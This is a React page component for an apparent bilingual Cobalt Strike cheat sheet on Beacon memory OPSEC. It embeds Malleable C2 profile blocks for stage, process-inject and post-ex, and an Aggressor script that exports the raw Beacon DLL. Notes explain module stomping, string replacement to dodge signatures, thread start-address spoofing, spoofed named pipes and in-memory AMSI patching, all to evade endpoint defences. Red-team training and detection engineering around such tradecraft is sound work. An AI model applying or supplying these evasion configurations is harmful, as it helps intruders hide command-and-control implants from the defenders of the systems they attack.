"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function MemoryConfigPage() {
  const { lang } = useLanguage();

  const stageBlock =
`stage {
    set userwx         "false";
    set copy_pe_header "false";
    set cleanup        "true";
    set module_x64     "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll"   "beacon.x64.sys";
        strrep "%s (admin)"       "%s [elevated]";
    }
}`;

  const bofConfig =
`process-inject {
    set bof_allocator    "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc        "8192";
    set startrwx         "false";
    set userwx           "false";
}`;

  const forkRunConfig =
`process-inject {
    set allocator "VirtualAllocEx";
    set startrwx  "false";
    set userwx    "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
        CreateRemoteThread;
    }
}`;

  const postExConfig =
`post-ex {
    set spawnto_x64  "%windir%\\sysnative\\msiexec.exe";
    set spawnto_x86  "%windir%\\syswow64\\msiexec.exe";
    set cleanup      "true";
    set pipename     "dotnet-diagnostic-#####,########-####-####-####-############";
    set thread_hint  "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";
}`;

  const exportDll =
`set BEACON_RDLL_GENERATE {
    local ('$path $handle');
    $path   = script_resource("beacon_raw." . $3 . ".dll");
    $handle = openf(">" . $path);
    writeb($handle, $2);
    closef($handle);
    return $null;
}
artifact_payload("http", "raw", "x64", "thread", "None");`;

  const sections = [
    {
      id: "stage",
      title: lang === "fr" ? "Stage - mémoire Beacon" : "Stage - Beacon memory",
      entries: [
        {
          cmd: stageBlock,
          why: lang === "fr"
            ? "userwx false : RW → copie → permissions par section (RX/.text, R/.rdata, RW/.data). copy_pe_header false : headers DOS/NT inutiles au runtime, les supprimer réduit les artefacts. module_x64 : module stomping - Beacon apparaît backed par Hydrogen.dll sur disque (choisir un DLL System32 >= 512 KB). strrep : remplace les strings dans le DLL - nouvelle string <= longueur originale, ne pas casser les strings HTTP internes."
            : "userwx false: RW → copy → per-section perms (RX/.text, R/.rdata, RW/.data). copy_pe_header false: DOS/NT headers unneeded at runtime, removing reduces artifacts. module_x64: module stomping - Beacon appears backed by Hydrogen.dll on disk (pick System32 DLL >= 512 KB). strrep: replaces strings in Beacon DLL - new string <= original length, do not break internal HTTP strings.",
        },
        {
          cmd: exportDll,
          why: lang === "fr"
            ? "Exporter le DLL Beacon brut pour identifier les strings à remplacer. Charger beacon.cna dans Script Manager, puis : strings -d beacon_raw.x64.dll -n 6 > strings.txt"
            : "Export the raw Beacon DLL to identify strings to replace. Load beacon.cna via Script Manager, then: strings -d beacon_raw.x64.dll -n 6 > strings.txt",
        },
      ],
    },
    {
      id: "inject-config",
      title: "Malleable C2 - process-inject / post-ex",
      entries: [
        {
          cmd: bofConfig,
          why: lang === "fr"
            ? "Config mémoire pour les BOFs (inline, thread Beacon principal). bof_reuse_memory évite les alloc/free répétés. min_alloc : calibrer selon les BOFs utilisés. startrwx/userwx false : RW au repos, RX à l'exécution."
            : "Memory config for BOFs (inline, Beacon main thread). bof_reuse_memory avoids repeated alloc/free. min_alloc: calibrate to typical BOF sizes. startrwx/userwx false: RW at rest, RX at execution.",
        },
        {
          cmd: forkRunConfig,
          why: lang === "fr"
            ? "Config injection pour les commandes fork & run (execute-assembly, powerpick, mimikatz...). allocator : VirtualAllocEx (cross-arch) ou NtMapViewOfSection (même arch). execute block évalué top-to-bottom - technique préférée en premier. Spoofing d'adresse de start : module!function+0x## pour CreateThread/CreateRemoteThread."
            : "Injection config for fork & run commands (execute-assembly, powerpick, mimikatz...). allocator: VirtualAllocEx (cross-arch) or NtMapViewOfSection (same-arch). execute block top-to-bottom - preferred technique first. Start address spoofing: module!function+0x## for CreateThread/CreateRemoteThread.",
        },
        {
          cmd: postExConfig,
          why: lang === "fr"
            ? "spawnto : processus sacrificiel pour la variante spawn (override en session). pipename : # → hex aléatoire. amsi_disable : patch mémoire AMSI dans powerpick/execute-assembly/psinject. Les variables %windir% ne fonctionnent pas en contexte SYSTEM - utiliser ak-settings pour les service binaries."
            : "spawnto: sacrificial process for spawn variant (override in-session). pipename: # → random hex. amsi_disable: AMSI memory patch in powerpick/execute-assembly/psinject. %windir% vars don't resolve in SYSTEM context - use ak-settings for service binaries.",
        },
      ],
    },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Cobalt Strike</p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Memory & Config</h1>
        <p className="mt-3 text-sm leading-7 text-muted-foreground">
          {lang === "fr"
            ? "OPSEC mémoire Beacon et blocs Malleable C2 : stage, process-inject, post-ex."
            : "Beacon memory OPSEC and Malleable C2 blocks: stage, process-inject, post-ex."}
        </p>
      </header>

      {sections.map((section) => (
        <section key={section.id} id={section.id} className="mb-10">
          <h2 className="mb-4 font-mono text-xs uppercase tracking-widest text-primary">
            {section.title}
          </h2>
          <div className="space-y-4">
            {section.entries.map((entry, i) => (
              <CheatsheetCommandCard key={i} cmd={entry.cmd} why={entry.why} lang={lang} />
            ))}
          </div>
        </section>
      ))}
    </div>
  );
}
